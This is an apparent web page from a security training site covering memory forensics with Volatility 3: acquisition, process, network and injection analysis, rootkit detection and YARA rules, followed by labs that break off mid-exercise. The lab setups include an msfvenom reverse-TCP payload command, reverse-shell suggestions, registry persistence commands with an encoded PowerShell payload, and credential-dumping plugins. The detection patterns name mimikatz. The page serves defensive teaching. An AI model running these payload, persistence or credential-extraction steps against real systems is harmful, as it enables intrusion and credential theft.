@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Memory Forensics</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Memory Forensics</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- NOTES TAB -->
+      <div class="tab-content active" id="notes">
+
+        <h2>Memory Acquisition</h2>
+        <p>Capture a full physical memory dump before analysis. Acquisition is volatile — act fast, minimize footprint on the target system.</p>
+
+        <h3>Linux — LiME (Linux Memory Extractor)</h3>
+<pre><code class="language-bash"># Build LiME kernel module (must match target kernel)
+git clone https://github.com/504ensicsLabs/LiME.git
+cd LiME/src
+make
+
+# Acquire memory — dump to local file
+sudo insmod lime-$(uname -r).ko "path=/tmp/memory.lime format=lime"
+
+# Acquire over network (avoid writing to target disk)
+sudo insmod lime-$(uname -r).ko "path=tcp:4444 format=lime"
+# On forensic workstation:
+nc &lt;target_ip&gt; 4444 > memory.lime
+
+# Formats: lime (recommended), raw, padded
+# "lime" preserves address space gaps; "raw" is flat binary</code></pre>
+
+        <h3>Windows — WinPmem</h3>
+<pre><code class="language-bash"># WinPmem — open-source, kernel driver based
+winpmem_mini_x64.exe output.raw
+
+# Dump to AFF4 format (compressed, with metadata)
+winpmem_mini_x64.exe -o output.aff4
+
+# DumpIt — single-click acquisition (Comae)
+DumpIt.exe
+# Produces a raw memory dump in the current directory
+
+# FTK Imager — GUI-based, can capture memory
+# File → Capture Memory → select output path
+
+# Belkasoft RAM Capturer — free, minimal footprint
+RamCapture64.exe output.mem</code></pre>
+
+        <h3>Virtual Machines</h3>
+<pre><code class="language-bash"># VMware — suspend VM, memory is in .vmem file
+ls *.vmem
+
+# VirtualBox — use debug console
+VBoxManage debugvm "VMName" dumpvmcore --filename=memory.elf
+
+# QEMU — dump via monitor
+virsh dump &lt;domain&gt; memory.dump --memory-only
+
+# Hyper-V — checkpoint creates .bin memory file
+# Convert with vm2dmp or volatility directly</code></pre>
+
+        <h2>Volatility 2 vs Volatility 3</h2>
+        <table>
+          <tr><th>Feature</th><th>Volatility 2</th><th>Volatility 3</th></tr>
+          <tr><td>Python version</td><td>Python 2.7</td><td>Python 3.x</td></tr>
+          <tr><td>OS identification</td><td>Profiles (<code>--profile=Win10x64_19041</code>)</td><td>ISF (Intermediate Symbol Format) — auto-detected</td></tr>
+          <tr><td>Symbol tables</td><td>Built-in profiles, community VTYPEs</td><td>JSON symbol tables, downloaded on demand from <code>volatility3/symbols/</code></td></tr>
+          <tr><td>Plugin naming</td><td><code>pslist</code>, <code>netscan</code></td><td><code>windows.pslist</code>, <code>windows.netscan</code></td></tr>
+          <tr><td>Linux support</td><td>Requires custom profile (module + System.map)</td><td>Uses ISF banners/dwarf2json — easier</td></tr>
+          <tr><td>Performance</td><td>Slower</td><td>Faster, parallel scanning</td></tr>
+          <tr><td>Install</td><td><code>pip2 install volatility</code></td><td><code>pip3 install volatility3</code></td></tr>
+        </table>
+<pre><code class="language-bash"># Volatility 3 installation
+pip3 install volatility3
+# Or from source:
+git clone https://github.com/volatilityfoundation/volatility3.git
+cd volatility3
+pip3 install -e .
+
+# Download symbol tables (ISF packs)
+# Windows: https://downloads.volatilityfoundation.org/volatility3/symbols/windows.zip
+# Linux:   https://downloads.volatilityfoundation.org/volatility3/symbols/linux.zip
+# Mac:     https://downloads.volatilityfoundation.org/volatility3/symbols/mac.zip
+# Extract to volatility3/symbols/
+
+# Volatility 2 profile identification
+vol.py -f memory.raw imageinfo
+vol.py -f memory.raw kdbgscan
+
+# Volatility 3 — auto-detects, no profile needed
+vol3 -f memory.raw windows.info</code></pre>
+
+        <h3>Linux ISF Generation (Volatility 3)</h3>
+<pre><code class="language-bash"># Generate ISF from a Linux kernel with dwarf2json
+# Install dwarf2json
+git clone https://github.com/volatilityfoundation/dwarf2json.git
+cd dwarf2json &amp;&amp; go build
+
+# Generate symbol table from kernel debug symbols
+./dwarf2json linux \
+  --elf /usr/lib/debug/boot/vmlinux-$(uname -r) \
+  --system-map /boot/System.map-$(uname -r) \
+  > linux-$(uname -r).json
+
+# Place in volatility3/symbols/linux/
+cp linux-*.json /path/to/volatility3/symbols/linux/</code></pre>
+
+        <h2>Volatility 3 Commands Reference</h2>
+
+        <h3>System &amp; Process Analysis</h3>
+        <table>
+          <tr><th>Plugin</th><th>Description</th></tr>
+          <tr><td><code>windows.info</code></td><td>OS version, build, architecture, KDBG address</td></tr>
+          <tr><td><code>windows.pslist</code></td><td>List processes from EPROCESS linked list (can be manipulated by rootkits)</td></tr>
+          <tr><td><code>windows.pstree</code></td><td>Process tree — parent/child relationships</td></tr>
+          <tr><td><code>windows.psscan</code></td><td>Scan for EPROCESS pool tags in physical memory — finds hidden/unlinked processes</td></tr>
+          <tr><td><code>windows.cmdline</code></td><td>Command-line arguments for each process</td></tr>
+          <tr><td><code>windows.envars</code></td><td>Environment variables per process</td></tr>
+          <tr><td><code>windows.handles</code></td><td>Open handles (files, registry keys, mutexes, events)</td></tr>
+          <tr><td><code>windows.dlllist</code></td><td>Loaded DLLs per process (from PEB)</td></tr>
+          <tr><td><code>windows.ldrmodules</code></td><td>Compare 3 PEB DLL lists — unlinked DLLs indicate injection</td></tr>
+          <tr><td><code>windows.sessions</code></td><td>Active logon sessions</td></tr>
+          <tr><td><code>windows.getservicesids</code></td><td>Service SIDs for service process correlation</td></tr>
+          <tr><td><code>windows.svcscan</code></td><td>Scan for Windows service records</td></tr>
+        </table>
+<pre><code class="language-bash"># Basic process analysis workflow
+vol3 -f memory.raw windows.pslist
+vol3 -f memory.raw windows.pstree
+vol3 -f memory.raw windows.psscan      # compare with pslist to find hidden procs
+vol3 -f memory.raw windows.cmdline
+vol3 -f memory.raw windows.dlllist --pid 1234
+
+# Filter by PID
+vol3 -f memory.raw windows.handles --pid 1234
+vol3 -f memory.raw windows.envars --pid 1234</code></pre>
+
+        <h3>Network Analysis</h3>
+        <table>
+          <tr><th>Plugin</th><th>Description</th></tr>
+          <tr><td><code>windows.netscan</code></td><td>Scan for network connections and listening sockets (TCP/UDP)</td></tr>
+          <tr><td><code>windows.netstat</code></td><td>Active network connections (like <code>netstat -anob</code>)</td></tr>
+        </table>
+<pre><code class="language-bash"># Network connections — find C2 channels
+vol3 -f memory.raw windows.netscan
+vol3 -f memory.raw windows.netstat
+
+# Output: PID, protocol, local addr, remote addr, state, created time
+# Look for:
+#   - Connections to unusual ports (4444, 8080, 443 to suspicious IPs)
+#   - ESTABLISHED connections from unexpected processes
+#   - Processes like notepad.exe, calc.exe with network connections (process hollowing)</code></pre>
+
+        <h3>Code Injection &amp; Malware Detection</h3>
+        <table>
+          <tr><th>Plugin</th><th>Description</th></tr>
+          <tr><td><code>windows.malfind</code></td><td>Find injected code — scans for VAD regions with PAGE_EXECUTE_READWRITE that contain potential shellcode (MZ headers, etc.)</td></tr>
+          <tr><td><code>windows.vadinfo</code></td><td>Virtual Address Descriptor details — memory region permissions, mapped files</td></tr>
+          <tr><td><code>windows.vadwalk</code></td><td>Walk the VAD tree for a process</td></tr>
+          <tr><td><code>windows.hollowfind</code></td><td>Detect process hollowing (if available as community plugin)</td></tr>
+        </table>
+<pre><code class="language-bash"># Detect injected code
+vol3 -f memory.raw windows.malfind
+vol3 -f memory.raw windows.malfind --pid 1234
+
+# Dump suspicious memory sections
+vol3 -f memory.raw windows.malfind --pid 1234 --dump
+
+# VAD analysis — look for suspicious permissions
+vol3 -f memory.raw windows.vadinfo --pid 1234
+# Red flags:
+#   PAGE_EXECUTE_READWRITE on private (non-image) memory
+#   Large RWX regions without a mapped file
+#   VAD tagged as Private with executable code</code></pre>
+
+        <h3>File &amp; Registry Analysis</h3>
+        <table>
+          <tr><th>Plugin</th><th>Description</th></tr>
+          <tr><td><code>windows.filescan</code></td><td>Scan for FILE_OBJECT structures in memory — all referenced files</td></tr>
+          <tr><td><code>windows.dumpfiles</code></td><td>Extract file content from memory (cached files, open files)</td></tr>
+          <tr><td><code>windows.hivelist</code></td><td>List registry hives loaded in memory</td></tr>
+          <tr><td><code>windows.printkey</code></td><td>Print registry key values</td></tr>
+          <tr><td><code>windows.hashdump</code></td><td>Extract NTLM password hashes from SAM/SYSTEM hives</td></tr>
+          <tr><td><code>windows.cachedump</code></td><td>Extract domain cached credentials (DCC2)</td></tr>
+          <tr><td><code>windows.lsadump</code></td><td>Dump LSA secrets (service account passwords, VPN creds)</td></tr>
+        </table>
+<pre><code class="language-bash"># File extraction
+vol3 -f memory.raw windows.filescan | grep -i "\.exe\|\.dll\|\.sys\|\.doc\|\.pdf"
+vol3 -f memory.raw windows.dumpfiles --pid 1234 --dump
+
+# Registry analysis
+vol3 -f memory.raw windows.hivelist
+vol3 -f memory.raw windows.printkey --key "Software\Microsoft\Windows\CurrentVersion\Run"
+vol3 -f memory.raw windows.printkey --key "SYSTEM\CurrentControlSet\Services"
+
+# Credential extraction
+vol3 -f memory.raw windows.hashdump
+vol3 -f memory.raw windows.cachedump
+vol3 -f memory.raw windows.lsadump</code></pre>
+
+        <h3>YARA Scanning</h3>
+<pre><code class="language-bash"># Scan memory with YARA rules
+vol3 -f memory.raw yarascan.YaraScan --yara-rules "rule test { strings: $a = \"password\" condition: $a }"
+vol3 -f memory.raw yarascan.YaraScan --yara-file /path/to/rules.yar
+vol3 -f memory.raw yarascan.YaraScan --yara-file rules.yar --pid 1234</code></pre>
+<pre><code class="language-python"># Example YARA rule for memory scanning
+rule Suspicious_Strings {
+    meta:
+        description = "Detect common malware indicators in memory"
+    strings:
+        $mz = { 4D 5A }                          // PE header
+        $cmd1 = "cmd.exe /c" nocase
+        $ps1 = "powershell" nocase
+        $ps2 = "-encodedcommand" nocase
+        $net1 = "WScript.Shell" nocase
+        $net2 = "COMSPEC" nocase
+        $c2_1 = /https?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+/
+    condition:
+        $mz at 0 and (2 of ($cmd*, $ps*, $net*) or $c2_1)
+}
+
+rule Mimikatz_Memory {
+    strings:
+        $s1 = "mimikatz" nocase
+        $s2 = "sekurlsa" nocase
+        $s3 = "kerberos::list" nocase
+        $s4 = "lsadump::sam" nocase
+        $s5 = "privilege::debug" nocase
+    condition:
+        2 of them
+}</code></pre>
+
+        <h2>Process Analysis Techniques</h2>
+
+        <h3>Identifying Hidden Processes</h3>
+        <p>Compare <code>pslist</code> (walks EPROCESS linked list) with <code>psscan</code> (pool tag scan). Processes in <code>psscan</code> but not <code>pslist</code> have been <strong>unlinked</strong> via DKOM (Direct Kernel Object Manipulation).</p>
+<pre><code class="language-bash"># Cross-reference process lists
+vol3 -f memory.raw windows.pslist > pslist.txt
+vol3 -f memory.raw windows.psscan > psscan.txt
+
+# Diff the PID lists — unlinked processes appear only in psscan
+diff &lt;(awk '{print $1}' pslist.txt | sort) &lt;(awk '{print $1}' psscan.txt | sort)</code></pre>
+
+        <h3>Process Hollowing Detection</h3>
+        <p>Process hollowing: attacker starts a legitimate process (e.g., svchost.exe) suspended, unmaps its image, maps malicious code, then resumes. The process looks legitimate in task manager but runs attacker code.</p>
+<pre><code class="language-bash"># Indicators:
+# 1. Process image path doesn't match the code in memory
+# 2. malfind shows PE headers (MZ/PE) in executable memory regions
+# 3. PEB ImageBaseAddress differs from actual loaded image
+# 4. Section permissions mismatch (private RWX where image section expected)
+
+vol3 -f memory.raw windows.malfind --pid &lt;suspect_pid&gt;
+# If you see MZ header at the start of a VAD region → likely hollowed
+
+# Dump the injected PE for static analysis
+vol3 -f memory.raw windows.malfind --pid &lt;suspect_pid&gt; --dump
+file pid.&lt;pid&gt;.*.dmp    # check if it's a valid PE</code></pre>
+
+        <h3>DLL Injection Detection</h3>
+<pre><code class="language-bash"># Compare three PEB DLL lists
+vol3 -f memory.raw windows.ldrmodules --pid &lt;pid&gt;
+# Columns: InLoad, InInit, InMem — all should be True for legitimate DLLs
+# False in any column for an image-backed DLL = suspicious
+
+# Check for unusual DLLs loaded into processes
+vol3 -f memory.raw windows.dlllist --pid &lt;pid&gt;
+# Red flags:
+#   DLLs loaded from temp directories
+#   DLLs with random/gibberish names
+#   DLLs not in expected System32/SysWOW64 paths
+#   Unsigned DLLs in otherwise fully signed processes</code></pre>
+
+        <h2>Rootkit Detection</h2>
+
+        <h3>DKOM (Direct Kernel Object Manipulation)</h3>
+        <p>Rootkits unlink their process from the <code>ActiveProcessLinks</code> doubly-linked list in EPROCESS. The process still runs (scheduler uses a different list) but is invisible to <code>pslist</code>.</p>
+<pre><code class="language-bash"># Detection: pslist vs psscan diff (as shown above)
+# psscan finds all EPROCESS structures via pool tag scanning
+# regardless of list manipulation
+
+# Additional DKOM targets:
+#   - Thread lists (ETHREAD unlinking)
+#   - Driver lists (hiding kernel drivers)
+#   - Handle table manipulation</code></pre>
+
+        <h3>SSDT &amp; IDT Hooks</h3>
+<pre><code class="language-bash"># SSDT (System Service Descriptor Table) hooking
+# Rootkit replaces function pointers in SSDT to intercept syscalls
+vol3 -f memory.raw windows.ssdt
+# Look for entries pointing outside ntoskrnl.exe or win32k.sys
+
+# IRP hooks — driver dispatch function hooking
+vol3 -f memory.raw windows.driverirp
+# Check if IRP handlers point to unexpected modules
+
+# Inline hooks — patching function prologues
+vol3 -f memory.raw windows.callbacks
+# Lists kernel notification callbacks (process, thread, image load)</code></pre>
+
+        <h3>Kernel Module Analysis</h3>
+<pre><code class="language-bash"># List loaded kernel modules
+vol3 -f memory.raw windows.modules
+vol3 -f memory.raw windows.modscan    # pool tag scan — finds unlinked modules
+
+# Compare — hidden drivers appear only in modscan
+vol3 -f memory.raw windows.driverscan  # scan for DRIVER_OBJECT structures
+
+# Dump suspicious kernel module
+vol3 -f memory.raw windows.moddump --dump --base &lt;module_base&gt;</code></pre>
+
+        <h2>Memory-Resident Malware</h2>
+        <p>Some malware exists only in memory — never touches disk (fileless malware). Common techniques:</p>
+        <table>
+          <tr><th>Technique</th><th>Detection</th></tr>
+          <tr><td><strong>PowerShell in-memory</strong></td><td><code>cmdline</code> — look for <code>-enc</code>, <code>-nop</code>, <code>IEX(</code>, <code>DownloadString</code></td></tr>
+          <tr><td><strong>Reflective DLL injection</strong></td><td><code>malfind</code> — PE headers in private RWX memory, not in any DLL list</td></tr>
+          <tr><td><strong>.NET in-memory assembly</strong></td><td>CLR loaded (<code>clr.dll</code>/<code>mscorwks.dll</code>) in unexpected processes</td></tr>
+          <tr><td><strong>Process hollowing</strong></td><td><code>malfind</code> + PEB mismatch + <code>procdump</code> hash ≠ disk file hash</td></tr>
+          <tr><td><strong>Thread injection</strong></td><td>Threads with start addresses in non-image memory regions</td></tr>
+          <tr><td><strong>APC injection</strong></td><td>Unusual APC queue entries, code in RWX regions</td></tr>
+        </table>
+<pre><code class="language-bash"># Fileless malware detection workflow
+# 1. Look for suspicious PowerShell
+vol3 -f memory.raw windows.cmdline | grep -i "powershell\|cmd.*\/c\|wscript\|cscript\|mshta\|rundll32"
+
+# 2. Check for encoded commands
+vol3 -f memory.raw windows.cmdline | grep -i "encodedcommand\|frombase64\|iex\|invoke-expression"
+
+# 3. Scan for injected code
+vol3 -f memory.raw windows.malfind
+
+# 4. YARA scan for known frameworks
+vol3 -f memory.raw yarascan.YaraScan --yara-file cobalt_strike.yar
+vol3 -f memory.raw yarascan.YaraScan --yara-file metasploit.yar</code></pre>
+
+        <h2>Windows Artifacts in Memory</h2>
+<pre><code class="language-bash"># Clipboard contents
+vol3 -f memory.raw windows.clipboard
+
+# Event logs (parsed from memory-mapped evtx files)
+vol3 -f memory.raw windows.filescan | grep -i "\.evtx"
+vol3 -f memory.raw windows.dumpfiles --virtaddr &lt;evtx_offset&gt;
+
+# MFT entries cached in memory
+vol3 -f memory.raw windows.mftscan
+
+# Scheduled tasks (useful for persistence detection)
+vol3 -f memory.raw windows.scheduled_tasks
+
+# Windows services
+vol3 -f memory.raw windows.svcscan
+# Look for services with unusual binary paths or running from temp dirs</code></pre>
+
+        <h2>Timeline from Memory</h2>
+<pre><code class="language-bash"># Volatility 3 timeliner — aggregates timestamps from multiple plugins
+vol3 -f memory.raw timeliner.Timeliner
+vol3 -f memory.raw timeliner.Timeliner --create-bodyfile > memory_timeline.body
+
+# Convert to mactime format
+mactime -b memory_timeline.body -d > memory_timeline.csv
+
+# Filter timeline around incident window
+mactime -b memory_timeline.body 2024-03-15..2024-03-16 > incident_window.csv
+
+# Sources combined by timeliner:
+#   Process create/exit times
+#   Network connection timestamps
+#   Registry key last-write times
+#   File object timestamps</code></pre>
+
+        <h2>Custom Volatility 3 Plugins</h2>
+<pre><code class="language-python">"""
+Custom Volatility 3 plugin template.
+Save to: volatility3/volatility3/framework/plugins/custom_plugin.py
+"""
+from volatility3.framework import interfaces, renderers
+from volatility3.framework.configuration import requirements
+from volatility3.plugins.windows import pslist
+
+class SuspiciousProcesses(interfaces.plugins.PluginInterface):
+    """Find processes with indicators of compromise."""
+
+    _required_framework_version = (2, 0, 0)
+
+    @classmethod
+    def get_requirements(cls):
+        return [
+            requirements.TranslationLayerRequirement(
+                name="primary", description="Memory layer"
+            ),
+            requirements.SymbolTableRequirement(
+                name="nt_symbols", description="Windows kernel symbols"
+            ),
+            requirements.PluginRequirement(
+                name="pslist", plugin=pslist.PsList, version=(2, 0, 0)
+            ),
+        ]
+
+    def _generator(self):
+        suspicious_names = ["cmd.exe", "powershell.exe", "rundll32.exe",
+                            "mshta.exe", "wscript.exe", "cscript.exe",
+                            "regsvr32.exe", "certutil.exe"]
+        for proc in pslist.PsList.list_processes(
+            self.context, self.config["primary"], self.config["nt_symbols"]
+        ):
+            name = proc.ImageFileName.cast("string", max_length=14, errors="replace")
+            ppid = proc.InheritedFromUniqueProcessId
+            if name.lower() in suspicious_names:
+                yield (0, (proc.UniqueProcessId, name, ppid,
+                           proc.CreateTime.render()))
+
+    def run(self):
+        return renderers.TreeGrid(
+            [("PID", int), ("Name", str), ("PPID", int), ("Created", str)],
+            self._generator(),
+        )</code></pre>
+<pre><code class="language-bash"># Run custom plugin
+vol3 -f memory.raw custom_plugin.SuspiciousProcesses
+
+# Plugin development tips:
+# - Place .py files in volatility3/framework/plugins/ or use --plugin-dirs
+vol3 --plugin-dirs /my/plugins/ -f memory.raw custom_plugin.MyPlugin
+# - Use PsList.list_processes() to iterate processes
+# - Use context.layers to access memory translation layers
+# - Renderers: TreeGrid for tables, text output via format_hints</code></pre>
+
+        <h2>Linux Memory Forensics</h2>
+<pre><code class="language-bash"># Volatility 3 Linux plugins
+vol3 -f memory.lime linux.pslist           # process list
+vol3 -f memory.lime linux.pstree           # process tree
+vol3 -f memory.lime linux.bash             # bash history from memory
+vol3 -f memory.lime linux.check_syscall    # detect syscall hooks
+vol3 -f memory.lime linux.check_modules    # hidden kernel modules
+vol3 -f memory.lime linux.lsmod            # loaded kernel modules
+vol3 -f memory.lime linux.proc_maps        # process memory maps
+vol3 -f memory.lime linux.tty_check        # tty/pts session info
+vol3 -f memory.lime linux.sockstat         # open sockets
+vol3 -f memory.lime linux.elfs             # ELF files in proc memory
+vol3 -f memory.lime linux.malfind          # injected code detection</code></pre>
+
+        <h2>Quick Reference — Investigation Workflow</h2>
+        <table>
+          <tr><th>Step</th><th>Goal</th><th>Plugin(s)</th></tr>
+          <tr><td>1. Identify OS</td><td>Confirm image &amp; kernel version</td><td><code>windows.info</code></td></tr>
+          <tr><td>2. Process audit</td><td>List all processes, find anomalies</td><td><code>pslist</code>, <code>pstree</code>, <code>psscan</code></td></tr>
+          <tr><td>3. Network check</td><td>Find C2 connections</td><td><code>netscan</code>, <code>netstat</code></td></tr>
+          <tr><td>4. Injection scan</td><td>Detect code injection / hollowing</td><td><code>malfind</code>, <code>ldrmodules</code></td></tr>
+          <tr><td>5. DLL review</td><td>Unusual/injected DLLs</td><td><code>dlllist</code>, <code>ldrmodules</code></td></tr>
+          <tr><td>6. Command lines</td><td>Attacker commands</td><td><code>cmdline</code>, <code>envars</code></td></tr>
+          <tr><td>7. Persistence</td><td>Registry run keys, services</td><td><code>printkey</code>, <code>svcscan</code></td></tr>
+          <tr><td>8. Credentials</td><td>Dumped passwords/hashes</td><td><code>hashdump</code>, <code>lsadump</code>, <code>cachedump</code></td></tr>
+          <tr><td>9. File recovery</td><td>Extract files from memory</td><td><code>filescan</code>, <code>dumpfiles</code></td></tr>
+          <tr><td>10. Timeline</td><td>Correlate events</td><td><code>timeliner</code></td></tr>
+        </table>
+
+      </div>
+
+      <!-- LAB TAB -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: Volatility 3 Setup &amp; Image Identification</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Install Volatility 3, download symbol packs, and identify a memory image's OS version and architecture.</p>
+          <div class="setup-code">
+            <p><strong>Setup:</strong></p>
+<pre><code class="language-bash"># Install Volatility 3
+pip3 install volatility3
+
+# Download Windows symbol pack
+wget https://downloads.volatilityfoundation.org/volatility3/symbols/windows.zip
+mkdir -p volatility3/symbols
+unzip windows.zip -d volatility3/symbols/
+
+# Obtain a sample memory dump
+# Option A: Use your own VM — suspend a Windows 10 VM, grab the .vmem
+# Option B: Download practice images from:
+#   - https://github.com/volatilityfoundation/volatility3/wiki/Memory-Samples
+#   - MemLabs: https://github.com/stuxnet999/MemLabs</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run <code>vol3 -f memory.raw windows.info</code> — note the OS version, build number, and architecture</li>
+              <li>Run <code>vol3 -f memory.raw banners.Banners</code> — check detected kernel banners</li>
+              <li>Verify symbol resolution: <code>vol3 -f memory.raw windows.pslist</code> — if it works, symbols are loaded correctly</li>
+              <li>Try with a wrong/missing symbol pack — observe the error message</li>
+              <li>Run <code>vol3 -f memory.raw windows.info 2&gt;&amp;1 | grep -i "layer\|kernel"</code> to confirm the translation layers</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: Process Listing &amp; Tree Analysis</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Enumerate all running processes, examine parent-child relationships, and identify process anomalies.</p>
+          <div class="setup-code">
+            <p><strong>Setup:</strong></p>
+<pre><code class="language-bash"># Use any Windows memory dump (practice images or your own VM)
+# Recommended: MemLabs Lab1 — https://github.com/stuxnet999/MemLabs
+
+# If creating your own: open several programs in a Windows VM,
+# start a cmd.exe from notepad (unusual parent), then dump memory.</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run <code>vol3 -f memory.raw windows.pslist</code> — save to a file for reference</li>
+              <li>Run <code>vol3 -f memory.raw windows.pstree</code> — map parent-child process chains</li>
+              <li>Identify expected Windows process hierarchy:
+                <ul>
+                  <li>System (PID 4) → smss.exe</li>
+                  <li>smss.exe → csrss.exe, wininit.exe</li>
+                  <li>wininit.exe → services.exe → svchost.exe (multiple)</li>
+                  <li>winlogon.exe → userinit.exe → explorer.exe</li>
+                </ul>
+              </li>
+              <li>Flag any deviations: svchost.exe not parented by services.exe? cmd.exe spawned from an unusual parent?</li>
+              <li>Run <code>vol3 -f memory.raw windows.cmdline</code> — do any processes have suspicious arguments?</li>
+              <li>Cross-reference with <code>vol3 -f memory.raw windows.psscan</code> — are there processes in psscan missing from pslist?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: Network Connection Analysis</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Extract network connections from a memory dump and identify potential C2 (command-and-control) communication.</p>
+          <div class="setup-code">
+            <p><strong>Setup:</strong></p>
+<pre><code class="language-bash"># Create a scenario: in a Windows VM, establish connections:
+#   - Open a browser to several sites
+#   - Start a netcat listener: nc -lvp 4444
+#   - From another host, connect: nc &lt;vm_ip&gt; 4444
+#   - Run a reverse shell or meterpreter for realism
+# Then dump memory with WinPmem or DumpIt</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run <code>vol3 -f memory.raw windows.netscan</code> — list all connections and listening ports</li>
+              <li>Identify ESTABLISHED connections — what remote IPs and ports are being used?</li>
+              <li>Cross-reference PIDs with <code>pslist</code> — which process owns each connection?</li>
+              <li>Flag suspicious connections: legitimate processes (notepad, calc) with network connections → hollowing indicator</li>
+              <li>Look for connections on known C2 ports: 4444, 8080, 8443, or high ephemeral ports</li>
+              <li>Check for connections to private IP ranges (10.x, 192.168.x) vs external IPs</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: DLL Analysis &amp; Injection Detection</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Examine loaded DLLs for each process, detect injected or unlinked DLLs using ldrmodules, and dump suspicious DLLs for analysis.</p>
+          <div class="setup-code">
+            <p><strong>Setup:</strong></p>
+<pre><code class="language-bash"># In a test VM, perform DLL injection:
+# Use a simple injector (e.g., from a malware analysis lab)
+# Or use PowerShell to load a DLL into a remote process
+
+# Alternatively use a known-infected memory dump from:
+#   CyberDefenders — malware memory challenges
+#   SANS memory forensics samples</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run <code>vol3 -f memory.raw windows.dlllist --pid &lt;pid&gt;</code> — list DLLs for a target process</li>
+              <li>Run <code>vol3 -f memory.raw windows.ldrmodules --pid &lt;pid&gt;</code> — compare InLoad, InInit, InMem columns</li>
+              <li>Any DLL with <code>False</code> in one or more columns is suspicious — it has been unlinked from that PEB list</li>
+              <li>Check DLL paths — DLLs loaded from <code>%TEMP%</code>, <code>AppData</code>, or random paths are red flags</li>
+              <li>Dump a suspicious DLL: <code>vol3 -f memory.raw windows.dlllist --pid &lt;pid&gt; --dump</code></li>
+              <li>Run <code>file</code> and <code>strings</code> on the dumped DLL — look for malicious indicators</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: Malfind — Code Injection Detection</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Use malfind to identify memory regions containing injected code, analyze VAD permissions, and extract injected payloads.</p>
+          <div class="setup-code">
+            <p><strong>Setup:</strong></p>
+<pre><code class="language-bash"># Use an infected memory dump or create one:
+# In a VM, run msfvenom payload injected into a process:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe
+
+# Or use a process hollowing tool to inject into svchost.exe
+# Then capture memory with DumpIt/WinPmem</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run <code>vol3 -f memory.raw windows.malfind</code> — scan all processes for injected code</li>
+              <li>Examine output: look for <code>PAGE_EXECUTE_READWRITE</code> protection and MZ/PE headers at region start</li>
+              <li>For each hit, note the PID, process name, and VAD start address</li>
+              <li>Dump the injected regions: <code>vol3 -f memory.raw windows.malfind --dump</code></li>
+              <li>Analyze dumped files: <code>file *.dmp</code>, <code>strings -a *.dmp | grep -i "http\|cmd\|shell\|password"</code></li>
+              <li>Cross-reference: does the flagged process have unexpected network connections? (<code>netscan</code>)</li>
+              <li>Check VAD details: <code>vol3 -f memory.raw windows.vadinfo --pid &lt;pid&gt;</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: Registry Extraction from Memory</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Extract registry hives from memory, enumerate persistence mechanisms, and find attacker-created registry keys.</p>
+          <div class="setup-code">
+            <p><strong>Setup:</strong></p>
+<pre><code class="language-bash"># In a test VM, add persistence via registry:
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\evil.exe"
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Update /t REG_SZ /d "powershell -enc BASE64PAYLOAD"
+
+# Add a fake service
+sc create EvilSvc binpath= "C:\Temp\svc.exe" start= auto
+
+# Dump memory</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
